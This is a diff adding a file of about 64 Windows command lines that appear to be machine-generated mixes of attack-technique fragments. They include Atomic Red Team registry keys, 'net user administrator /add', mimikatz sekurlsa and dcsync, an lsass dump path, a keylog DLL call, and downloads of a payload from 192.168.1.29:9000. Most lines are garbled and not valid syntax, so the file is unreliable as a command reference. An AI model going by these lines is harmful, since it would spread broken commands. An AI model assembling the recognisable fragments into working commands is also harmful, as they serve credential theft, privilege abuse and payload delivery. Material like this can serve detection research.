@@ -1,0 +1,64 @@
+net accounts
+net user $ ( `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+net user administrator /add
+net `` hkcu\environment -ibck $ `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest : reg_dword -member `` ''
+adfind.exe -f ( new-object net.webclient \\ '' : % localappdata % //192.168.1.29:9000/payload/redirect.sdb -o )
+.\hydra -l $ ( `` hklm\software\microsoft\windows \programdata\microsoft\windows\start appdata\microsoft\windows\start options\svchost.exe `` @ : `` filter $ : \programdata\microsoft\windows\start \users\
+bypassuac.exe $ profile
+`` $ filterargs = `` $ { filename_regex ''
+240 media net.webclient ) \\ $ : \system\currentcontrolset\services\winsock2\parameters -name [ net.securityprotocoltype ] : :createprocessfromparent [ ] : \updater.exe -command : f
+namp -sn $ { filename_regex }
+net user administrator /add
+computername= $ ( `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_sz -class activescripteventconsumer '__filtertoconsumerbinding ' ' set automatic $ { directory_path }
+rundll32 $ { hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+$ consumer=set-wmiinstance -namespace `` cor_profiler
+net user administrator /add
+net user /add $ { registry_path
+remove-item -path -name `` $ shell.createshortcut : @ `` defaultaccount '' defaultaccount
+set-executionpolicy -executionpolicy -- net.securityprotocoltype http : http : :utf8.getstring ( `` http : :dcsync ueraccount get \users\yingjie\appdata\local\temp\lsass.dmp /grant -filter a : -accepteula `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out : $ { username } -l $ { filename_regex }
+net user $ `` administrators ;
+make_image.py $ { malicious_exe_path } /user : administrators $ { filter % appdata % ) \\ $ { id you create = $ ( ) -arguments $ i ;
+sekurlsa : logon/logoff -ibck $ { http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+get-ciminstance -classname -force -usebasicparsing ; /user : ; full
+wlrmdr.exe -s $ { red components\atomic_test '' $ { \users\
+for : zero_padding.py $ { username } ;
+sekurlsa : :dcsync /domain : /for=c
+reg query spooler `` hklm\software\microsoft\active components\atomic_test '' /v `` cor_profiler '' $ { minidump i ;
+fltmc.exe unload administrators $ { user_name }
+rdrleakdiag.exe service \system32\osk.exe.bak
+net user `` `` hklm\software\microsoft\windows username `` @ `` '' t1547.009 @ `` hklm\software\microsoft\windows domain } @
+net user /add $ wscriptshell.createshortcut domain
+rdrleakdiag.exe /p -u $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 % \users\
+`` kerberos `` put $ { weak_service_name } ;
+reg `` hklm\software\microsoft\windows hkcu\software\classes\clsid\ hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' /f
+rundll32 popcalc.dll , keylog
+net localgroup administrators administrators $ { filename_regex
+net localgroup administrators
+net user administrator /add
+net user administrator /add
+adfind.exe -f /set foreach-object a )
+net computername= = `` '' /add ;
+bitsadmin.exe /create
+get-childitem -filter `` : '' /domain : \users\
+net localgroup administrators `` @ 5
+cmdkey /list
+invoke-screencap $ user /add
+net start administrators
+hashcat.exe -a debugger -l $ ( `` select *
+net user `` $ service ; } /grant administrators : f
+copy $ ( `` $ shortcutlocation ;
+rmdir /s -classname win32_bios
+net localgroup administrators
+reg query hklm\software\microsoft
+rdrleakdiag.exe /p -w filename_regex
+net `` hklm\software\microsoft\windows nt\currentversion\windows `` `` cor_profiler '' /t reg_dword /success : disable
+powershell `` c : \windows\system32\spool\tools\printbrm.exe -r /user : $ ( `` hklm\system\currentcontrolset\services\winsock2\parameters '' `` cor_profiler = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+assoc $ { malicious_exe_path } c : you % copy set-wmiinstance -namespace .id $ ( `` cor_enable_profiling '' administrators ''
+net localgroup
+out-minidump.exe
+net user administrator `` $ wscriptshell.createshortcut ( `` { dnsrecon } -u $ { username } password= $ { username } password= $ { username } password= $ profile
+cmdkey /list
+adfind.exe -f new-object -list | \\ $ profile ;
+namp -sn $ { domain
+namp -sn $ { filename_regex }
